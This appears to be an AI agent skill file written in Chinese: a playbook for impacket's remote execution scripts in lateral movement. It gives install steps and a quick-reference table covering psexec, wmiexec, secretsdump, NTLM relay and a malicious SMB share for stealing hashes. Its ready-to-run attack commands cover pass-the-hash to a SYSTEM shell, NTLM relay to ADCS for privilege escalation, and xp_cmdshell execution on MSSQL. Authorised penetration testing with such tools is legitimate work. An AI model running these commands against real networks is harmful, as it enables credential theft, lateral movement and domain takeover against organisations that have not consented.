---
name: impacket-protocol-exec
description: 渗透工具 skill:impacket 协议执行脚本集 的安装、参数速查与攻击场景 playbook。当任务涉及 远程服务横向移动 需要调用 impacket 协议执行脚本集 时使用。
when-to-use: 渗透工具 skill:impacket 协议执行脚本集 的安装、参数速查与攻击场景 playbook。当任务涉及 远程服务横向移动 需要调用 impacket 协议执行脚本集 时使用。
---

# impacket 协议执行脚本集

- 攻击大类:C31 远程服务横向移动
- 上游仓库:https://github.com/fortra/impacket
- 上游 License:Apache-2.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/fortra/impacket && cd impacket && pip install .
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `psexec.py` | SMB+服务控制管理器远程 SYSTEM shell |
| `wmiexec.py` | WMI 半交互 shell(不留文件,日志少) |
| `smbexec.py` | SMB 共享+ bat 执行的 shell |
| `dcomexec.py` | DCOM(MMC20/ShellWindows)远程执行 |
| `atexec.py` | 计划任务远程执行,回显结果 |
| `mssqlclient.py` | MSSQL 交互客户端(xp_cmdshell 提权执行) |
| `-hashes LM:NT` | Pass-the-Hash 认证 |
| `-k / -no-pass` | Kerberos 票据认证 |
| `ntlmrelayx.py` | NTLM 中继(--delegate-sid / --escalate-user) |
| `secretsdump.py` | 远程 DCSync/注册表导出哈希 |
| `smbserver.py` | 恶意 SMB 共享(诱骗窃取哈希) |

## 攻击场景 Playbook

### PTH 横向拿 shell

```bash
impacket-psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:<NT> administrator@10.0.0.5
impacket-wmiexec.py -hashes <LM:NT> admin@10.0.0.5
```

### NTLM 中继到 ADCS 提权

```bash
impacket-ntlmrelayx.py -t http://dc01/certsrv/certfnsh.asp --adcs --smb2support
impacket-ntlmrelayx.py --delegate-access -t ldap://dc01 -smb2support
```

### MSSQL 盲注执行

```bash
impacket-mssqlclient.py -windows-auth sql_svc@10.0.0.8
enable_xp_cmdshell; xp_cmdshell whoami
```

## 注意事项

现有 skill 仅覆盖 kerberoast/ESC8 两个点,本 skill 补齐协议执行脚本矩阵。脚本名即入口,参数全兼容 Kerberos/哈希/明文三套认证。
